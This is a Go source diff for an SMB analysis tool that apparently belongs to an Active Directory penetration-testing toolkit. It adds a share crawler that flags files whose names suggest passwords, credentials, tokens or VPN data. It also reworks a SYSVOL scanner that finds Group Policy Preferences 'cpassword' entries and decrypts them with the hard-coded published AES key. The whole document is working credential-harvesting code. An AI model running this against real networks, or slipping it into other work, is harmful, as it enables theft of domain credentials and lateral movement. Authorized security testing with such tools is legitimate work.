@@ -6,9 +6,9 @@ import (
 	"crypto/cipher"
 	"encoding/base64"
 	"fmt"
-	"io"
 	"log"
 	"net"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -21,6 +21,14 @@ type GPPSimpleResult struct {
 	User     string
 	Password string
 	Changed  string
+}
+
+// FileFinding represents a sensitive file found on a share
+type FileFinding struct {
+	Path     string `json:"path"`
+	Share    string `json:"share"`
+	Size     int64  `json:"size"`
+	Category string `json:"category"` // "Log", "Config", "Script", "Secret"
 }
 
 // SMBAnalyzer handles SMB-related discovery (Shares, GPP, etc.)
@@ -58,6 +66,93 @@ func (sa *SMBAnalyzer) EnumerateShares() ([]string, error) {
 	return shares, nil
 }
 
+// DeepFileHunt scans a share for sensitive files
+func (sa *SMBAnalyzer) DeepFileHunt(share string) ([]FileFinding, error) {
+	session, conn, err := sa.createSession()
+	if err != nil {
+		return nil, err
+	}
+	defer session.Logoff()
+	defer conn.Close()
+
+	fs, err := session.Mount(share)
+	if err != nil {
+		return nil, err
+	}
+	defer fs.Umount()
+
+	var findings []FileFinding
+	sensitiveExts := map[string]string{
+		".log":    "Log",
+		".xml":    "Config",
+		".txt":    "Log/Text",
+		".config": "Config",
+		".ps1":    "Script",
+		".bat":    "Script",
+		".vbs":    "Script",
+		".ini":    "Config",
+		".bak":    "Backup",
+	}
+
+	sensitiveKeywords := []string{"pass", "cred", "secret", "token", "auth", "key", "db", "sql", "vpn"}
+
+	// Walk the share (depth limited to 3 to avoid infinite loops/large shares)
+	sa.walk(fs, ".", 0, 3, sensitiveExts, sensitiveKeywords, share, &findings)
+
+	return findings, nil
+}
+
+func (sa *SMBAnalyzer) walk(fs *smb2.Share, path string, depth, maxDepth int, exts map[string]string, keywords []string, share string, findings *[]FileFinding) {
+	if depth > maxDepth {
+		return
+	}
+
+	files, err := fs.ReadDir(path)
+	if err != nil {
+		return
+	}
+
+	for _, file := range files {
+		fullName := filepath.Join(path, file.Name())
+		if file.IsDir() {
+			sa.walk(fs, fullName, depth+1, maxDepth, exts, keywords, share, findings)
+			continue
+		}
+
+		lowerName := strings.ToLower(file.Name())
+		ext := filepath.Ext(lowerName)
+
+		isSensitive := false
+		category := ""
+
+		// Check extension
+		if cat, ok := exts[ext]; ok {
+			isSensitive = true
+			category = cat
+		}
+
+		// Check keywords
+		for _, kw := range keywords {
+			if strings.Contains(lowerName, kw) {
+				isSensitive = true
+				if category == "" {
+					category = "Potential Secret"
+				}
+				break
+			}
+		}
+
+		if isSensitive {
+			*findings = append(*findings, FileFinding{
+				Path:     fullName,
+				Share:    share,
+				Size:     file.Size(),
+				Category: category,
+			})
+		}
+	}
+}
+
 // CheckAdminAccess checks if the user has administrative access (can access ADMIN$ or C$)
 func (sa *SMBAnalyzer) CheckAdminAccess() (bool, error) {
 	session, conn, err := sa.createSession()
@@ -86,8 +181,6 @@ func (sa *SMBAnalyzer) CheckAdminAccess() (bool, error) {
 
 // ScanGPP searches SYSVOL for GPP passwords
 func (sa *SMBAnalyzer) ScanGPP() ([]GPPSimpleResult, error) {
-	log.Printf("[*] Searching SYSVOL for Group Policy Preferences (GPP) passwords...")
-
 	session, conn, err := sa.createSession()
 	if err != nil {
 		return nil, err
@@ -104,14 +197,45 @@ func (sa *SMBAnalyzer) ScanGPP() ([]GPPSimpleResult, error) {
 
 	var results []GPPSimpleResult
 
-	// Common GPP XML paths
-	// We'll search from the root of the share to find the domain-specific folders
+	// Walk SYSVOL searching for XML files
 	err = sa.walkGPP(fs, ".", &results)
 	if err != nil {
 		log.Printf("[!] Error walking SYSVOL: %v", err)
 	}
 
 	return results, nil
+}
+
+func (sa *SMBAnalyzer) walkGPP(fs *smb2.Share, path string, results *[]GPPSimpleResult) error {
+	files, err := fs.ReadDir(path)
+	if err != nil {
+		return nil
+	}
+
+	for _, file := range files {
+		fullName := filepath.Join(path, file.Name())
+		if file.IsDir() {
+			sa.walkGPP(fs, fullName, results)
+			continue
+		}
+
+		if strings.HasSuffix(strings.ToLower(file.Name()), ".xml") {
+			data, err := fs.ReadFile(fullName)
+			if err != nil {
+				continue
+			}
+
+			if bytes.Contains(data, []byte("cpassword")) {
+				log.Printf("[+] Found potential GPP file: %s", fullName)
+				creds := sa.parseGPPXML(data)
+				for _, cred := range creds {
+					cred.File = fullName
+					*results = append(*results, cred)
+				}
+			}
+		}
+	}
+	return nil
 }
 
 func (sa *SMBAnalyzer) createSession() (*smb2.Session, net.Conn, error) {
@@ -146,7 +270,6 @@ func (sa *SMBAnalyzer) createSession() (*smb2.Session, net.Conn, error) {
 			return s, conn, nil
 		} else {
 			lastErr = err
-			log.Printf("[!] SMB auth failed with domain '%s', trying next...", dName)
 		}
 	}
 
@@ -159,33 +282,24 @@ func (sa *SMBAnalyzer) createSession() (*smb2.Session, net.Conn, error) {
 		upnUser := fmt.Sprintf("%s@%s", cleanUser, domainPart)
 		
 		if s, conn, err := sa.tryDial("", upnUser); err == nil {
-			log.Printf("[+] SMB auth succeeded with UPN: %s", upnUser)
 			return s, conn, nil
-		} else {
-			lastErr = err
-			log.Printf("[!] SMB auth failed with UPN '%s'...", upnUser)
 		}
 	}
 
-	return nil, nil, fmt.Errorf("SMB session failed after all retries: %v", lastErr)
+	return nil, nil, fmt.Errorf("SMB session failed: %v", lastErr)
 }
 
 func (sa *SMBAnalyzer) tryDial(domain, user string) (*smb2.Session, net.Conn, error) {
-	addr := sa.Target
-	if !strings.Contains(addr, ":") {
-		addr = fmt.Sprintf("%s:445", addr)
-	}
-
-	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+	conn, err := net.DialTimeout("tcp", sa.Target+":445", 5*time.Second)
 	if err != nil {
 		return nil, nil, err
 	}
 
 	d := &smb2.Dialer{
 		Initiator: &smb2.NTLMInitiator{
+			Domain:   domain,
 			User:     user,
 			Password: sa.Password,
-			Domain:   domain,
 		},
 	}
 
@@ -198,131 +312,96 @@ func (sa *SMBAnalyzer) tryDial(domain, user string) (*smb2.Session, net.Conn, er
 	return s, conn, nil
 }
 
-func (sa *SMBAnalyzer) walkGPP(fs *smb2.Share, path string, results *[]GPPSimpleResult) error {
-	entries, err := fs.ReadDir(path)
-	if err != nil {
-		return err
-	}
-
-	for _, entry := range entries {
-		fullPath := path + "\\" + entry.Name()
-		if entry.IsDir() {
-			sa.walkGPP(fs, fullPath, results)
-		} else if strings.HasSuffix(strings.ToLower(entry.Name()), ".xml") {
-			// Analyze the XML file
-			sa.analyzeXML(fs, fullPath, results)
-		}
-	}
-	return nil
-}
-
-func (sa *SMBAnalyzer) analyzeXML(fs *smb2.Share, path string, results *[]GPPSimpleResult) {
-	f, err := fs.Open(path)
-	if err != nil {
-		return
-	}
-	defer f.Close()
-
-	content, err := io.ReadAll(f)
-	if err != nil {
-		return
-	}
-
-	// Look for 'cpassword' in the XML
-	if !bytes.Contains(content, []byte("cpassword")) {
-		return
-	}
-
-	log.Printf("[+] Found potential GPP file: %s", path)
-
-	// Minimal XML parsing to find cpassword, userName, and changed
-	// In a real implementation, we'd use proper structs for Groups.xml, Services.xml, etc.
-	// For now, let's use string extraction for speed
+func (sa *SMBAnalyzer) parseGPPXML(data []byte) []GPPSimpleResult {
+	// Simple string parsing to avoid complex XML dependencies
+	var results []GPPSimpleResult
 	
-	cpass := extractTag(content, "cpassword")
-	user := extractTag(content, "userName")
-	changed := extractTag(content, "changed")
-
-	if cpass != "" {
-		decrypted, err := decryptGPP(cpass)
-		if err == nil {
-			*results = append(*results, GPPSimpleResult{
-				File:     path,
-				User:     user,
-				Password: decrypted,
-				Changed:  changed,
-			})
-			log.Printf("[!] CRACKED GPP PASSWORD: %s -> %s", user, decrypted)
+	// Look for cpassword patterns
+	content := string(data)
+	lines := strings.Split(content, "\n")
+	for _, line := range lines {
+		if strings.Contains(line, "cpassword=") {
+			user := sa.extractAttr(line, "userName=")
+			cpass := sa.extractAttr(line, "cpassword=")
+			changed := sa.extractAttr(line, "changed=")
+			
+			if cpass != "" {
+				pass, _ := DecryptGPP(cpass)
+				results = append(results, GPPSimpleResult{
+					User:     user,
+					Password: pass,
+					Changed:  changed,
+				})
+			}
 		}
 	}
+	return results
 }
 
-func extractTag(content []byte, tag string) string {
-	// Simple string-based extraction for common GPP XML attributes
-	pattern := []byte(tag + "=\"")
-	start := bytes.Index(content, pattern)
-	if start == -1 {
-		return ""
+func (sa *SMBAnalyzer) extractAttr(line, attr string) string {
+	if idx := strings.Index(line, attr); idx != -1 {
+		val := line[idx+len(attr):]
+		if len(val) > 1 {
+			quote := val[0:1]
+			val = val[1:]
+			if endIdx := strings.Index(val, quote); endIdx != -1 {
+				return val[:endIdx]
+			}
+		}
 	}
-	start += len(pattern)
-	end := bytes.Index(content[start:], []byte("\""))
-	if end == -1 {
-		return ""
-	}
-	return string(content[start : start+end])
+	return ""
 }
 
-// decryptGPP decrypts the Microsoft 'cpassword' using the static AES key
-// Static key: 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
-func decryptGPP(cpassword string) (string, error) {
-	// 1. Pad base64 if needed
+// DecryptGPP decrypts a GPP cpassword string
+func DecryptGPP(cpassword string) (string, error) {
+	// The famous GPP key
+	key := []byte{
+		0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
+		0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
+		0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
+		0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
+	}
+
+	// Fix padding if needed
 	for len(cpassword)%4 != 0 {
 		cpassword += "="
 	}
 
-	// 2. Decode base64
-	data, err := base64.StdEncoding.DecodeString(cpassword)
+	decoded, err := base64.StdEncoding.DecodeString(cpassword)
 	if err != nil {
 		return "", err
 	}
-
-	// 3. Static AES Key
-	key := []byte{
-		0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 
-		0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 
-		0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 
-		0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
-	}
-
-	// 4. Initialization Vector (IV) is always 16 null bytes
-	iv := make([]byte, 16)
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return "", err
 	}
 
-	mode := cipher.NewCBCDecrypter(block, iv)
-	decrypted := make([]byte, len(data))
-	mode.CryptBlocks(decrypted, data)
-
-	// 5. Remove PKCS7 padding
-	if len(decrypted) == 0 {
-		return "", fmt.Errorf("decryption resulted in empty data")
+	if len(decoded) < aes.BlockSize {
+		return "", fmt.Errorf("ciphertext too short")
 	}
-	paddingLen := int(decrypted[len(decrypted)-1])
-	if paddingLen > len(decrypted) {
-		return string(decrypted), nil // sometimes it's not padded correctly
+
+	iv := make([]byte, aes.BlockSize) // GPP uses null IV
+	mode := cipher.NewCBCDecrypter(block, iv)
+	plaintext := make([]byte, len(decoded))
+	mode.CryptBlocks(plaintext, decoded)
+
+	// Unpad (PKCS7)
+	if len(plaintext) == 0 {
+		return "", fmt.Errorf("decryption failed")
+	}
+	padding := int(plaintext[len(plaintext)-1])
+	if padding > len(plaintext) {
+		return string(plaintext), nil // Return as is if padding looks wrong
 	}
 	
-	// Convert from UTF-16LE to UTF-8 (simple version as passwords are usually ASCII)
-	// We'll just strip the null bytes for now
-	var final []byte
-	for _, b := range decrypted[:len(decrypted)-paddingLen] {
-		if b != 0 {
-			final = append(final, b)
+	// Convert from UTF-16LE to UTF-8 (simple approach)
+	var result strings.Builder
+	for i := 0; i < len(plaintext)-padding; i += 2 {
+		if i+1 < len(plaintext) {
+			result.WriteByte(plaintext[i])
 		}
 	}
 
-	return string(final), nil
+	return result.String(), nil
 }
